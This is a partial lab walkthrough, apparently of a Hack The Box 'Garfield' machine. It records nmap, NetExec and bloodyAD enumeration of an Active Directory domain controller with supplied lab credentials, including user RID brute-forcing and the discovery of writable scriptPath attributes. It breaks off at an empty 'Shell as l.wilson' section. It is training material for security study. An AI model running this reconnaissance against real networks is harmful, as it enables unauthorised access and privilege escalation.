# Machine info
As is common in real life pentests, you will start the Garfield box with credentials for the following account j.arbuckle / Th1sD4mnC4t!@1978

```python
j.arbuckle:Th1sD4mnC4t!@1978
```

# Host file setup
```python
❯❯❯ sudo nxc smb 10.129.86.27 --generate-hosts-file /etc/hosts

SMB         10.129.86.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc01.garfield.htb -vv

Nmap scan report for dc01.garfield.htb (10.129.86.27)
Host is up, received user-set (0.013s latency).
rDNS record for 10.129.86.27: DC01.garfield.htb
Scanned at 2026-11-09 17:30:55 GMT for 66s
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
2179/tcp  open  vmrdp            syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3389/tcp  open  ms-wbt-server    syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49675/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49678/tcp open  unknown          syn-ack
49889/tcp open  unknown          syn-ack
49920/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 66.21 seconds
```

## Nmap
```python
❯❯❯ nmap -p 53,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5985,9389 -A --min-rate=2000 -sT -Pn dc01.garfield.htb
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-09 17:33 +0000
Nmap scan report for dc01.garfield.htb (10.129.86.27)
Host is up (0.013s latency).
rDNS record for 10.129.86.27: DC01.garfield.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-10 01:33:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-11-05T04:54:07
|_Not valid after:  2027-05-07T04:54:07
|_ssl-date: 2026-11-10T01:33:51+00:00; +7h59m54s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-11-10T01:33:30+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth is enabled as with all domain controllers by deftault but cannot use it to enumerate

The guest account is also disabled

But i was given credentials so i can try them

```python
❯❯❯ nxc smb dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'
SMB         10.129.86.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.86.27    445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
```

These credentials work

```python
❯❯❯ nxc smb dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
SMB         10.129.86.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.86.27    445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.86.27    445    DC01             [*] Enumerated shares
SMB         10.129.86.27    445    DC01             Share           Permissions     Remark
SMB         10.129.86.27    445    DC01             -----           -----------     ------
SMB         10.129.86.27    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.86.27    445    DC01             C$                              Default share
SMB         10.129.86.27    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.86.27    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.86.27    445    DC01             SYSVOL          READ            Logon server share 
```

Just default read access on the default shares

```python
❯❯❯ nxc smb dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
RODC01$
krbtgt_8245
j.arbuckle
l.wilson
l.wilson_adm
```

Interesting how there is two `krbtgt` accounts

```python
❯❯❯ nxc smb dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users 

SMB         10.129.86.27    445    DC01             krbtgt_8245                   2025-08-17 11:33:39 0       Key Distribution Center service account for read-only domain controller 
```

Ill also use nxc to pull out the user descriptions for this second krbtgt account

# Writable objects as `j.arbuckle`

```python
❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: DC=garfield.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=garfield,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.garfield.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=garfield,DC=htb
permission: CREATE_CHILD
```

So some of this is default other bits are not

```python
❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable --detail

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

These are the 4 interesting writable objects from the output, and running `--detail` in bloodyAD shows the actual attribute i have write over

# Shell as `l.wilson`

```python

```